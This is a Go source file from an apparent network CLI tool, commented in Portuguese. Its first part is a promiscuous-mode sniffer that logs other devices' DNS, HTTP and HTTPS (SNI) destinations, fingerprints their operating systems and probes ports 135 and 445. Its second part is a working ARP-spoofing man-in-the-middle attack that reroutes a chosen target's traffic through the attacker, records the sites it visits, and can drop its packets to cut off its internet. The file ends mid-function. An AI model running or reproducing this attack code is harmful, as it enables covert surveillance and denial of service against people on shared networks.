package sniffer

import (
	"context"
	"fmt"
	"log"
	"net"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"bytes"

	"github.com/gabrifranca/cli_ping/internal/report"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	manuf "github.com/timest/gomanuf"
)

type SnifferService struct{}

func NewSnifferService() *SnifferService {
	return &SnifferService{}
}

// Estrutura para armazenar dados e gerar um relatório ao final
type SnifferLogs struct {
	TotalPackets     int64
	TotalBytes       int64
	DiscoveredHosts  map[string]string         // Mapeamento de IP para Endereço MAC
	DNSQueries       map[string]map[string]int // Domínio -> IP Solicitante -> Contagem
	TCPFlagsCounter  map[string]int            // Contagem de Flags TCP ("SYN", "FIN", etc.)
	SuspiciousIPs    map[string]int            // Contagem de pacotes suspeitos por IP (Ex: potenciais SYN Scans)
	ProtocolsCounter map[string]int            // Estatísticas de protocolos trafegados
	HostTTL          map[string]uint8          // TTL observado por IP (para OS Fingerprinting)
	HostOSByDNS      map[string]string         // OS detectado por Captive Portal DNS (IP -> "iOS/macOS", "Android", etc.)
	HostNames        map[string]string         // Nomes amigáveis dos dispositivos (via mDNS/DHCP)
	HostOSByDHCP     map[string]string         // OS detectado via Fingerprint de DHCP (Option 55)
	HostAccesses     map[string]map[string]int // IP -> Domínio -> Contagem de Acessos
}

// Domínios de Captive Portal conhecidos para detecção de SO
var captivePortalDomains = map[string]string{
	// Apple (iOS / macOS)
	"captive.apple.com":       "iOS/macOS (Apple)",
	"www.apple.com":           "iOS/macOS (Apple)",
	"gsp1.apple.com":          "iOS/macOS (Apple)",
	"www.icloud.com":          "iOS/macOS (Apple)",
	"configuration.apple.com": "iOS/macOS (Apple)",
	"gs-loc.apple.com":        "iOS/macOS (Apple)",
	"init.push.apple.com":     "iOS/macOS (Apple)",
	"courier.push.apple.com":  "iOS/macOS (Apple)",
	// Android / Google
	"connectivitycheck.gstatic.com": "Android (Google)",
	"connectivitycheck.android.com": "Android (Google)",
	"clients3.google.com":           "Android (Google)",
	"play.googleapis.com":           "Android (Google)",
	"www.google.com":                "Android (Google)",
	// Samsung (Android)
	"d.comenrz.net":            "Android (Samsung)",
	"samsungcloudsolution.com": "Android (Samsung)",
	"samsungcloudsolution.net": "Android (Samsung)",
	"config.samsungads.com":    "Android (Samsung)",
	// Microsoft Windows
	"www.msftconnecttest.com":         "Windows (Microsoft)",
	"www.msftncsi.com":                "Windows (Microsoft)",
	"dns.msftncsi.com":                "Windows (Microsoft)",
	"ipv6.msftconnecttest.com":        "Windows (Microsoft)",
	"settings-win.data.microsoft.com": "Windows (Microsoft)",
	// Linux
	"nmcheck.gnome.org":        "Linux (GNOME)",
	"network-test.debian.org":  "Linux (Debian)",
	"detectportal.firefox.com": "Linux/Firefox",
}

func NewSnifferLogs() *SnifferLogs {
	return &SnifferLogs{
		DiscoveredHosts:  make(map[string]string),
		DNSQueries:       make(map[string]map[string]int),
		TCPFlagsCounter:  make(map[string]int),
		SuspiciousIPs:    make(map[string]int),
		ProtocolsCounter: make(map[string]int),
		HostTTL:          make(map[string]uint8),
		HostOSByDNS:      make(map[string]string),
		HostNames:        make(map[string]string),
		HostOSByDHCP:     make(map[string]string),
		HostAccesses:     make(map[string]map[string]int),
	}
}

func (s *SnifferService) SniffNetwork(ctx context.Context) error {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Println("Erro ao buscar interfaces (Verifique se o Npcap está instalado e rodando como Adm):", err)
		return err
	}

	if len(devices) == 0 {
		log.Println("Nenhuma interface encontrada.")
		return fmt.Errorf("nenhuma interface encontrada")
	}

	// Busca a primeira interface válida (IPv4, não-loopback e não-APIPA)
	var deviceName string
	var deviceDesc string
	var deviceIP string
	for _, dev := range devices {
		for _, addr := range dev.Addresses {
			ip := addr.IP.String()
			if ip != "127.0.0.1" && !strings.HasPrefix(ip, "169.254.") && addr.IP.To4() != nil {
				deviceName = dev.Name
				deviceDesc = dev.Description
				deviceIP = ip
				break
			}
		}
		if deviceName != "" {
			break
		}
	}
	if deviceName == "" {
		deviceName = devices[0].Name // Fallback
		deviceDesc = devices[0].Description
	}

	fmt.Printf("\n  [*] Iniciando escuta passiva...\n")
	fmt.Printf("      Interface: %s\n", deviceDesc)
	fmt.Printf("      IP Local: %s\n", deviceIP)

	// Abre a interface. Modo promíscuo é TRUE.
	handle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
	if err != nil {
		log.Println("  [-] Erro ao abrir dispositivo:", err)
		return err
	}
	defer handle.Close()

	// Recupera MAC e CIDR para a varredura ativa
	myMAC, cidr := s.getInterfaceDetails(deviceIP)
	if myMAC != nil && cidr != "" {
		fmt.Printf("  [*] Iniciando Varredura ARP Ativa em %s (Background)...\n", cidr)
		go s.ActiveARPSweep(deviceName, myMAC, net.ParseIP(deviceIP), cidr)
	}

	// Calcula o IP de broadcast da sub-rede dinamicamente
	var broadcastAddr string
	if cidr != "" {
		if _, ipNet, err := net.ParseCIDR(cidr); err == nil {
			broadcastAddr = s.broadcastIP(ipNet).String()
		}
	}

	fmt.Println("  [*] Escutando todo o tráfego da rede (Modo Promíscuo)...")
	fmt.Println("  [!] Pressione ENTER para encerrar a captura e gerar o RELATÓRIO DE ANÁLISE.")

	// Inicializa o nosso coletor de logs
	logs := NewSnifferLogs()

	for {
		select {
		case <-ctx.Done():
			fmt.Println("\n  [*] Escuta passiva finalizada. Processando dados analisados...")
			s.analyzeLogs(logs)
			return nil
		default:
			data, _, err := handle.ReadPacketData()
			if err != nil {
				continue // Provavelmente timeout do ReadPacketData, continua tentando
			}

			packet := gopacket.NewPacket(data, handle.LinkType(), gopacket.Default)

			// Incrementa estatísticas gerais
			atomic.AddInt64(&logs.TotalPackets, 1)
			atomic.AddInt64(&logs.TotalBytes, int64(len(data)))

			var srcIP, dstIP string
			var srcMAC string
			var srcPort, dstPort string
			var protocol string = "Desconhecido"
			var extraInfo string
			var ttl uint8

			// 1. Camada Ethernet (Captura de Endereços MAC)
			if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
				eth, _ := ethLayer.(*layers.Ethernet)
				srcMAC = eth.SrcMAC.String()
				protocol = "Ethernet"
			}

			// 2. Camada ARP (Excelente para Mapeamento Passivo de Rede e detectar Spoofing)
			if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
				arp, _ := arpLayer.(*layers.ARP)
				srcIP = net.IP(arp.SourceProtAddress).String()
				dstIP = net.IP(arp.DstProtAddress).String()

				// Ignora tráfego originado pela nossa própria máquina
				if srcIP == deviceIP {
					continue
				}

				protocol = "ARP"
				logs.DiscoveredHosts[srcIP] = srcMAC
				extraInfo = "Protocolo de Resolução de Endereços (ARP)"

				// --- INJECTION: Ping ativo para descobrir o TTL ---
				// Quando descobrirmos a máquina via ARP, mandamos um Ping (se ainda não temos um TTL > 4)
				if myMAC != nil {
					targetIP := net.IP(arp.SourceProtAddress)
					if currentTTL, exists := logs.HostTTL[targetIP.String()]; !exists || currentTTL <= 4 {
						targetMAC := net.HardwareAddr(arp.SourceHwAddress)
						go s.sendICMPEchoRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP)
						go s.sendTCPSynRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP, 135)
						go s.sendTCPSynRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP, 445)
					}
				}
			}

			// 3. Camada de Rede (IPv4/IPv6)
			if netLayer := packet.NetworkLayer(); netLayer != nil {
				srcIP = netLayer.NetworkFlow().Src().String()
				dstIP = netLayer.NetworkFlow().Dst().String()
				protocol = netLayer.LayerType().String()

				// Filtro para ignorar IP ruidoso (Broadcast local) e a própria máquina
				if srcIP == deviceIP || dstIP == deviceIP || srcIP == broadcastAddr || dstIP == broadcastAddr || srcIP == "255.255.255.255" || dstIP == "255.255.255.255" {
					continue
				}

				// Extrai o TTL para OS Fingerprinting e armazena por IP
				if ipv4Layer := packet.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
					ipv4, _ := ipv4Layer.(*layers.IPv4)
					ttl = ipv4.TTL
					if srcIP != "" && ttl > 0 {
						// Ignora TTL de pacotes multicast (SSDP, LLMNR, mDNS) que possuem TTL fixo em 1 ou 255, poluindo a base real
						ipDestino := net.ParseIP(dstIP)
						if ipDestino != nil && !ipDestino.IsMulticast() && ttl > 5 {
							if currentTTL, exists := logs.HostTTL[srcIP]; !exists || ttl > currentTTL {
								logs.HostTTL[srcIP] = ttl
							}
						}
					}
				}

				// Associa IP ao MAC descoberto
				if srcIP != "" && srcMAC != "" {
					logs.DiscoveredHosts[srcIP] = srcMAC
				}
			}

			// 4. Camada ICMP (Ping, Traceroute, Unreachable)
			if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
				protocol = "ICMP"
				icmp, _ := icmpLayer.(*layers.ICMPv4)
				extraInfo = fmt.Sprintf("Tipo: %d, Código: %d", icmp.TypeCode.Type(), icmp.TypeCode.Code())
			}

			// 5. Camada de Transporte (TCP/UDP e Flags TCP)
			if transportLayer := packet.TransportLayer(); transportLayer != nil {
				protocol = transportLayer.LayerType().String()
				srcPort = transportLayer.TransportFlow().Src().String()
				dstPort = transportLayer.TransportFlow().Dst().String()

				if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
					tcp, _ := tcpLayer.(*layers.TCP)
					var flags []string
					if tcp.SYN {
						flags = append(flags, "SYN")
						logs.TCPFlagsCounter["SYN"]++
					}
					if tcp.ACK {
						flags = append(flags, "ACK")
						logs.TCPFlagsCounter["ACK"]++
					}
					if tcp.FIN {
						flags = append(flags, "FIN")
						logs.TCPFlagsCounter["FIN"]++
					}
					if tcp.RST {
						flags = append(flags, "RST")
						logs.TCPFlagsCounter["RST"]++
					}
					if tcp.PSH {
						flags = append(flags, "PSH")
						logs.TCPFlagsCounter["PSH"]++
					}
					if tcp.URG {
						flags = append(flags, "URG")
						logs.TCPFlagsCounter["URG"]++
					}

					if len(flags) > 0 {
						extraInfo += fmt.Sprintf("[Flags: %s] ", strings.Join(flags, ","))
					}

					// Heurística de Segurança: Detecta possível SYN Scan (Muitos pacotes SYN sem ACK)
					if tcp.SYN && !tcp.ACK {
						logs.SuspiciousIPs[srcIP]++
					}

					// Captura SNI em conexões HTTPS
					if dstPort == "443" && len(tcp.Payload) > 0 {
						sni := parseTLSSNI(tcp.Payload)
						if sni != "" {
							extraInfo += fmt.Sprintf("[SNI HTTPS: %s] ", sni)
							if srcIP != "" {
								if logs.HostAccesses[srcIP] == nil {
									logs.HostAccesses[srcIP] = make(map[string]int)
								}
								logs.HostAccesses[srcIP][sni]++
							}
						}
					}

					// Captura Host em conexões HTTP
					if dstPort == "80" && len(tcp.Payload) > 0 {
						host := parseHTTPHost(tcp.Payload)
						if host != "" {
							extraInfo += fmt.Sprintf("[HTTP Host: %s] ", host)
							if srcIP != "" {
								if logs.HostAccesses[srcIP] == nil {
									logs.HostAccesses[srcIP] = make(map[string]int)
								}
								logs.HostAccesses[srcIP][host]++
							}
						}
					}
				}
			}

			// Inspeção de DHCP (Estratégia 2)
			if dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4); dhcpLayer != nil {
				dhcp, _ := dhcpLayer.(*layers.DHCPv4)
				for _, opt := range dhcp.Options {
					if opt.Type == layers.DHCPOptHostname {
						logs.HostNames[srcIP] = string(opt.Data)
					}
					if opt.Type == layers.DHCPOptParamsRequest {
						reqList := fmt.Sprintf("%v", opt.Data)
						if strings.Contains(reqList, "44 46 47") || strings.Contains(reqList, "46 47 31") || strings.Contains(reqList, "249 252") || strings.Contains(reqList, "3 6 15 31 33") {
							logs.HostOSByDHCP[srcIP] = "Windows"
						} else if strings.Contains(reqList, "114 119 252") {
							logs.HostOSByDHCP[srcIP] = "Apple iOS/macOS"
						} else if strings.Contains(reqList, "26 28 51") || strings.Contains(reqList, "58 59") || strings.Contains(reqList, "1 3 6 15 26") {
							logs.HostOSByDHCP[srcIP] = "Android"
						}
					}
				}
			}

			// Inspeção de Payload bruto para mDNS / NetBIOS (Estratégia 1)
			if appLayer := packet.ApplicationLayer(); appLayer != nil {
				payload := string(appLayer.Payload())
				if (dstPort == "5353" || dstPort == "137") && len(payload) > 5 {
					// Extrai dicas de SO se estiver em texto claro
					if strings.Contains(payload, "iPhone") {
						logs.HostOSByDNS[srcIP] = "iOS (Apple)"
					}
					if strings.Contains(payload, "MacBook") || strings.Contains(payload, "Macmini") || strings.Contains(payload, "iMac") {
						logs.HostOSByDNS[srcIP] = "macOS (Apple)"
					}
					if strings.Contains(payload, "iPad") {
						logs.HostOSByDNS[srcIP] = "iOS (Apple)"
					}
					if strings.Contains(payload, "Android") {
						logs.HostOSByDNS[srcIP] = "Android"
					}
					if strings.Contains(payload, "DESKTOP-") || strings.Contains(payload, "LAPTOP-") || strings.Contains(payload, "WORKGROUP") {
						logs.HostOSByDNS[srcIP] = "Windows"
					}
				}
			}

			// 6. Camada de Aplicação (Consultas DNS / Monitoramento de acessos)
			if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
				dns, _ := dnsLayer.(*layers.DNS)
				if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 {
					dnsQuery := string(dns.Questions[0].Name)
					extraInfo += fmt.Sprintf("[Consulta DNS: %s] ", dnsQuery)

					// Verifica se o mapa interno para este domínio já existe
					if logs.DNSQueries[dnsQuery] == nil {
						logs.DNSQueries[dnsQuery] = make(map[string]int)
					}
					// Incrementa a contagem para o IP de origem específico
					logs.DNSQueries[dnsQuery][srcIP]++

					// Adiciona nos acessos do host
					if srcIP != "" {
						if logs.HostAccesses[srcIP] == nil {
							logs.HostAccesses[srcIP] = make(map[string]int)
						}
						logs.HostAccesses[srcIP][dnsQuery]++
					}

					// Técnica 3: Detecção de OS via Captive Portal DNS
					dnsLower := strings.ToLower(dnsQuery)
					if detectedOS, match := captivePortalDomains[dnsLower]; match {
						if srcIP != "" {
							logs.HostOSByDNS[srcIP] = detectedOS
						}
					}
				}
			}

			// Identificando TLS/SSL rudimentarmente (Trafego HTTPS Criptografado)
			if (dstPort == "443" || srcPort == "443") && packet.ApplicationLayer() != nil {
				appPayload := packet.ApplicationLayer().Payload()
				if len(appPayload) > 0 && appPayload[0] == 0x16 {
					extraInfo += "[Dados TLS/SSL Criptografados] "
				}
			}

			// Registra protocolo nas estatísticas
			logs.ProtocolsCounter[protocol]++

			// Formatação Visual em tempo real
			portInfoSrc, portInfoDst := "", ""
			if srcPort != "" {
				portInfoSrc = ":" + srcPort
			}
			if dstPort != "" {
				portInfoDst = ":" + dstPort
			}

			ttlInfo, macInfo := "", ""
			if ttl > 0 {
				ttlInfo = fmt.Sprintf("[TTL:%d] ", ttl)
			}
			if srcMAC != "" {
				vendor := manuf.Search(srcMAC)
				if vendor != "" {
					macInfo = fmt.Sprintf("[%s|%s] ", srcMAC, vendor)
				} else {
					macInfo = fmt.Sprintf("[%s] ", srcMAC)
				}
			}

			fmt.Printf("  [>] %s%s%s -> %s%s [%s] %s%s\n", macInfo, srcIP, portInfoSrc, dstIP, portInfoDst, protocol, ttlInfo, extraInfo)
		}
	}
}

// ARPSpoofMitM executa o ataque de ARP Spoofing contra um alvo específico.
// Isso força o tráfego do alvo a passar pela nossa máquina, permitindo
// a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
// O parâmetro showLogs controla a exibição em tempo real dos logs de interceptação no terminal.
// O parâmetro isBlocked, quando ativo, diz ao sniffer para destruir os pacotes e bloquear a internet do alvo.
func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool) error {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Println("  [-] Erro ao buscar interfaces:", err)
		return err
	}

	// Descobre a interface de rede ativa
	var deviceName, deviceDesc, deviceIP string
	for _, dev := range devices {
		for _, addr := range dev.Addresses {
			ip := addr.IP.String()
			if ip != "127.0.0.1" && !strings.HasPrefix(ip, "169.254.") && addr.IP.To4() != nil {
				deviceName = dev.Name
				deviceDesc = dev.Description
				deviceIP = ip
				break
			}
		}
		if deviceName != "" {
			break
		}
	}
	if deviceName == "" {
		log.Println("  [-] Nenhuma interface válida encontrada.")
		return fmt.Errorf("nenhuma interface válida encontrada")
	}

	fmt.Printf("\n  [*] ARP Spoof (Man-in-the-Middle)\n")
	fmt.Printf("      Interface: %s\n", deviceDesc)
	fmt.Printf("      IP Local:  %s\n", deviceIP)
	fmt.Printf("      Alvo:      %s\n", targetIP)

	// Recupera nosso MAC e CIDR
	myMAC, cidr := s.getInterfaceDetails(deviceIP)
	if myMAC == nil || cidr == "" {
		log.Println("  [-] Erro ao recuperar detalhes da interface.")
		return fmt.Errorf("erro ao recuperar detalhes da interface")
	}

	// Descobre o Gateway via tabela de rotas do SO
	gatewayIP := gatewayIPFromCIDROrOS(cidr)
	if gatewayIP == nil {
		log.Println("  [-] Erro: não foi possível determinar o gateway.")
		return fmt.Errorf("não foi possível determinar o gateway")
	}

	fmt.Printf("      Gateway:   %s\n", gatewayIP.String())

	// Resolve o MAC do Gateway
	fmt.Printf("  [*] Resolvendo MAC do Gateway...\n")
	gatewayMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), gatewayIP)
	if gatewayMAC == nil {
		log.Println("  [-] Não foi possível resolver o MAC do Gateway.")
		return fmt.Errorf("não foi possível resolver o MAC do Gateway")
	}
	fmt.Printf("      Gateway MAC: %s\n", gatewayMAC.String())

	// Resolve o MAC do Alvo
	var targetMAC net.HardwareAddr

	if manualMAC != "" {
		targetMAC, _ = net.ParseMAC(manualMAC)
	}

	if targetMAC == nil {
		fmt.Printf("  [*] Resolvendo MAC do Alvo (%s)...\n", targetIP)
		targetMAC = s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(targetIP))
	}

	if targetMAC == nil {
		fmt.Printf("  [-] ARP Request falhou. Tentando buscar em dispositivos conhecidos...\n")
		known := loadKnownDevices()
		for macStr, dev := range known {
			if dev.LastIP == targetIP {
				parsedMAC, err := net.ParseMAC(macStr)
				if err == nil {
					targetMAC = parsedMAC
					fmt.Printf("  [+] MAC encontrado no cache local: %s\n", macStr)
					break
				}
			}
		}
	}

	if targetMAC == nil {
		fmt.Printf("\n  [!] Não foi possível descobrir o MAC de %s automaticamente.\n", targetIP)
		fmt.Printf("  [!] Reinicie o MitM e forneça o MAC manualmente quando solicitado.\n")
	}

	if targetMAC == nil {
		fmt.Println("  [-] Operação cancelada ou falha na resolução do MAC.")
		return fmt.Errorf("operação cancelada ou falha na resolução do MAC")
	}
	fmt.Printf("      Alvo MAC:    %s\n", targetMAC.String())

	// Removemos a ativação do IP Forwarding do SO!
	// Dependeremos exclusivamente do nosso Software Forwarding (Zero-Allocation)
	// Isso evita conflitos de ICMP Redirect e bypassa restrições locais de roteamento.
	fmt.Printf("  [*] Utilizando Zero-Allocation Software Forwarding interno.\n")

	// Abre o handle para injeção de pacotes ARP
	poisonHandle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
	if err != nil {
		log.Println("  [-] Erro ao abrir handle para envenenamento:", err)
		return err
	}
	defer poisonHandle.Close()

	// Abre um segundo handle para captura do tráfego interceptado
	captureHandle, err := pcap.OpenLive(deviceName, 65535, true, 100*time.Millisecond)
	if err != nil {
		log.Println("  [-] Erro ao abrir handle de captura:", err)
		return err
	}
	defer captureHandle.Close()

	fmt.Printf("\n  %s\n", strings.Repeat("=", 65))
	fmt.Printf("  [✓] ENVENENAMENTO ARP ATIVO!\n")
	fmt.Printf("  [✓] Todo tráfego de %s agora passa por nós.\n", targetIP)
	fmt.Printf("  [!] Pressione ENTER para encerrar e restaurar a rede.\n")
	fmt.Printf("  %s\n\n", strings.Repeat("=", 65))

	// Inicializa os logs para captura
	logs := NewSnifferLogs()

	// Mutex para acesso thread-safe aos logs
	var logsMu sync.Mutex

	// Goroutine 1: Envia pacotes ARP forjados a cada 1.5 segundos
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				// Diz ao ALVO: "O Gateway sou EU" (nosso MAC, IP do gateway)
				_ = s.sendARPReply(poisonHandle, myMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
				// Diz ao GATEWAY: "O Alvo sou EU" (nosso MAC, IP do alvo)
				_ = s.sendARPReply(poisonHandle, myMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
				time.Sleep(1500 * time.Millisecond)
			}
		}
	}()

	// Configuração extrema de performance para a captura (evita lag)
	err = captureHandle.SetBPFFilter(fmt.Sprintf("host %s", targetIP))
	if err != nil {
		fmt.Printf("  [!] Aviso: Não foi possível aplicar Filtro BPF na captura: %v\n", err)
	}

	// Goroutine 2: Captura e encaminha o tráfego instantaneamente (Fast Path)
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				data, _, err := captureHandle.ReadPacketData()
				if err != nil {
					continue
				}

				// ======== ZERO-ALLOCATION SOFTWARE FORWARDING ========
				// Manipulamos o slice de bytes "raw" diretamente sem criar estruturas gopacket
				// Data[0:6] = DstMAC | Data[6:12] = SrcMAC

				if len(data) > 14 { // Garantir que temos um cabeçalho Ethernet
					// Se o bloqueio total (Negar WiFi) estiver ativo, descarta tudo silenciosamente.
					if isBlocked != nil && isBlocked.Load() {
						continue
					}

					// Filtrar Echoes: Ignorar pacotes que nós mesmos acabamos de injetar
					if bytes.Equal(data[6:12], myMAC) {
						continue
					}

					var forwarded bool
					isTargetSrc := bytes.Equal(data[6:12], targetMAC)
					isGatewaySrc := bytes.Equal(data[6:12], gatewayMAC)

					// Pacote vindo do Alvo para fora (roteamento -> Gateway)
					if isTargetSrc && bytes.Equal(data[0:6], myMAC) {
						// === TRACER ICMP ===
						// Verifica se é um pacote IPv4 (0x0800) e protocolo ICMP (1) para printar sem gerar parsing caro na rede
						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
							if showTracer != nil && showTracer.Load() {
								fmt.Println("  [TRACER] 1. Recebi PING do Alvo (Target -> Attacker)")
							}
						}

						// Modifica in-place
						copy(data[0:6], gatewayMAC) // Novo Destino: Gateway
						copy(data[6:12], myMAC)     // Nova Origem: Nós
						_ = captureHandle.WritePacketData(data)
						
						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
							if showTracer != nil && showTracer.Load() {
								fmt.Println("  [TRACER] 2. Encaminhei PING para Roteador (Attacker -> Gateway)")
							}
						}
						forwarded = true
					} else if isGatewaySrc && bytes.Equal(data[0:6], myMAC) { 
						// Pacote voltando da Internet (Gateway) para o Alvo
						
						// === TRACER ICMP ===
						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
							if showTracer != nil && showTracer.Load() {
								fmt.Println("  [TRACER] 3. Recebi RESPOSTA do Roteador (Gateway -> Attacker)")
							}
						}

						// O Gateway manda para nós (porque envenenamos a tabela dele).
						// Verificamos o IP de destino para confirmar se não é o nosso próprio tráfego.
						packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.NoCopy)
						if netLayer := packet.NetworkLayer(); netLayer != nil {
							if netLayer.NetworkFlow().Dst().String() == targetIP {
								copy(data[0:6], targetMAC) // Novo Destino: Alvo
								copy(data[6:12], myMAC)    // Nova Origem: Nós
								_ = captureHandle.WritePacketData(data)
								
								if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
									if showTracer != nil && showTracer.Load() {
										fmt.Println("  [TRACER] 4. Devolvi RESPOSTA para Alvo (Attacker -> Target) [ROTA OK]")
									}
								}
								forwarded = true
							}
						}
					}

					if forwarded {
						atomic.AddInt64(&logs.TotalPackets, 1)
						atomic.AddInt64(&logs.TotalBytes, int64(len(data)))

						// ======== ANÁLISE ASSÍNCRONA ========
						// Faz uma cópia rápida do slice para a goroutine usar livremente
						pktDataCopy := make([]byte, len(data))
						copy(pktDataCopy, data)

						go func(pktData []byte) {
							// Cria o packet na goroutine para evitar gargalo no loop principal
							pkt := gopacket.NewPacket(pktData, layers.LayerTypeEthernet, gopacket.Default)

							netLayer := pkt.NetworkLayer()
							if netLayer == nil {
								return
							}
							sIP := netLayer.NetworkFlow().Src().String()
							dIP := netLayer.NetworkFlow().Dst().String()
							
							var srcMAC string
							if ethLayer := pkt.Layer(layers.LayerTypeEthernet); ethLayer != nil {
								eth, _ := ethLayer.(*layers.Ethernet)
								srcMAC = eth.SrcMAC.String()
							}

							var pendingLogs []string

							logsMu.Lock()

							if ipv4Layer := pkt.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
								ipv4, _ := ipv4Layer.(*layers.IPv4)
								ttl := ipv4.TTL
								if sIP == targetIP && ttl > 5 {
									ipDestino := net.ParseIP(dIP)
									if ipDestino != nil && !ipDestino.IsMulticast() {
										if currentTTL, exists := logs.HostTTL[sIP]; !exists || ttl > currentTTL {
											logs.HostTTL[sIP] = ttl
										}
									}
								}
							}

							if sIP == targetIP && srcMAC != "" {
								logs.DiscoveredHosts[sIP] = srcMAC
							}

							if tcpLayer := pkt.Layer(layers.LayerTypeTCP); tcpLayer != nil {
								tcp, _ := tcpLayer.(*layers.TCP)
								dPort := tcp.DstPort.String()

								if sIP == targetIP {
									if dPort == "443" && len(tcp.Payload) > 0 {
										sni := parseTLSSNI(tcp.Payload)
										if sni != "" {
											if logs.HostAccesses[sIP] == nil {
												logs.HostAccesses[sIP] = make(map[string]int)
											}
											logs.HostAccesses[sIP][sni]++
											if showLogs != nil && showLogs.Load() {
												pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → HTTPS: %s\n", sIP, sni))
											}
										}
									}

									if dPort == "80" && len(tcp.Payload) > 0 {
										host := parseHTTPHost(tcp.Payload)
										if host != "" {
											if logs.HostAccesses[sIP] == nil {
												logs.HostAccesses[sIP] = make(map[string]int)
											}
											logs.HostAccesses[sIP][host]++
											if showLogs != nil && showLogs.Load() {
												pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → HTTP: %s\n", sIP, host))
											}
										}
									}
								}
							}

							if dnsLayer := pkt.Layer(layers.LayerTypeDNS); dnsLayer != nil {
								dns, _ := dnsLayer.(*layers.DNS)
								if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && sIP == targetIP {
									dnsQuery := string(dns.Questions[0].Name)
									if logs.HostAccesses[sIP] == nil {
										logs.HostAccesses[sIP] = make(map[string]int)
									}
									logs.HostAccesses[sIP][dnsQuery]++

									dnsLower := strings.ToLower(dnsQuery)
									if detectedOS, match := captivePortalDomains[dnsLower]; match {
										logs.HostOSByDNS[sIP] = detectedOS
									}

									if showLogs != nil && showLogs.Load() {
										pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → DNS: %s\n", sIP, dnsQuery))
									}
								}
							}

							logsMu.Unlock()

							for _, msg := range pendingLogs {
								fmt.Print(msg)
							}
						}(pktDataCopy)
					}
				}
			}
		}
	}()

	// Bloqueia até o canal de parada ser fechado
	<-ctx.Done()

	fmt.Printf("\n  [*] Encerrando ARP Spoof...\n")

	// RESTAURAÇÃO: Envia os ARPs legítimos de volta para curar a tabela ARP
	fmt.Printf("  [*] Restaurando tabelas ARP originais (enviando 5 pacotes de cura)...\n")
	for i := 0; i < 5; i++ {
		// Restaura o alvo: diz que o Gateway real tem o MAC real do gateway
		_ = s.sendARPReply(poisonHandle, gatewayMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
		// Restaura o gateway: diz que o alvo real tem o MAC real do alvo
		_ = s.sendARPReply(poisonHandle, targetMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
		time.Sleep(200 * time.Millisecond)
	}

	// Desativa IP Forwarding (se estava ativo por engano fora do MitM)
	disableIPForwarding()

	// Gera relatório
	logsMu.Lock()
	defer logsMu.Unlock()

	// Monta o relatório completo em string para salvar e exibir
	var sb strings.Builder

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString(fmt.Sprintf("             RELATÓRIO MitM - INTERCEPTAÇÃO DO ALVO %s\n", targetIP))
	sb.WriteString("=========================================================================\n")
	sb.WriteString(fmt.Sprintf("  Volume Interceptado: %d Pacotes | %.2f KB\n", logs.TotalPackets, float64(logs.TotalBytes)/1024.0))

	// Identificação de SO
	if ttlVal, exists := logs.HostTTL[targetIP]; exists {
		var detectedOS string
		switch {
		case ttlVal >= 1 && ttlVal <= 64:
			detectedOS = "Linux/Android/iOS/macOS (TTL base 64)"
		case ttlVal >= 65 && ttlVal <= 128:
			detectedOS = "Windows (TTL base 128)"
		case ttlVal >= 129 && ttlVal <= 255:
			detectedOS = "Roteador/Equipamento de Rede (TTL base 255)"
		}

		// DNS tem prioridade
		if osDNS, ok := logs.HostOSByDNS[targetIP]; ok {
			detectedOS = osDNS
		}

		sb.WriteString(fmt.Sprintf("  TTL Capturado: %d → SO Detectado: %s\n", ttlVal, detectedOS))

		// Salva no banco de dados de dispositivos conhecidos
		if mac, ok := logs.DiscoveredHosts[targetIP]; ok && mac != "" {
			sb.WriteString(fmt.Sprintf("  MAC Alvo: %s\n", mac))
			knownDevices := loadKnownDevices()
			knownDev := knownDevices[mac]
			knownDev.OS = detectedOS
			knownDev.LastIP = targetIP
			knownDevices[mac] = knownDev
			saveKnownDevices(knownDevices)
			sb.WriteString("  [✓] Dispositivo salvo no banco de dados local.\n")
		}
	} else {
		sb.WriteString("  [!] Nenhum TTL Unicast capturado do alvo. Ele pode não ter gerado tráfego.\n")
	}

	// Lista de acessos capturados (DNS + HTTPS + HTTP)
